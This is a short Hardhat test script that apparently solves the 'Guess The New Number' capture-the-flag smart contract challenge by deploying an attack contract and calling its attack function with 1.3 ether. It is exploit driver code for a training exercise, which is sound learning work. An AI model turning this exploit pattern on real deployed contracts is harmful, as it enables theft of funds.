import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { expect } from "chai";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract;

before(async () => {
    const challengeContractAddr = `0x01c48700020A604D72E4B31734a9c7444CCa4D49`

    accounts = await ethers.getSigners();
    eoa = accounts[0];
    const challengeFactory = await ethers.getContractFactory("GuessTheNewNumberChallenge")
    challengeFactory.attach(challengeContractAddr)

    const attackFactory = await ethers.getContractFactory("GuessTheNewNumberChallengeAttack")
    contract = await attackFactory.deploy(challengeContractAddr)
    console.log(`contract deployed at: ${contract.address}`)
    await contract.deployed();
    // challengeFactory.attach("0xe2Ebde73e1B53d5a02753AB875B9887Cd0848f8A")
});

it("solves the challenge", async () => {
    const tx = await contract.attack({
        value: ethers.utils.parseEther("1.3"),
    });

    const txHash = tx && tx.hash
    expect(txHash).to.not.be.undefined
});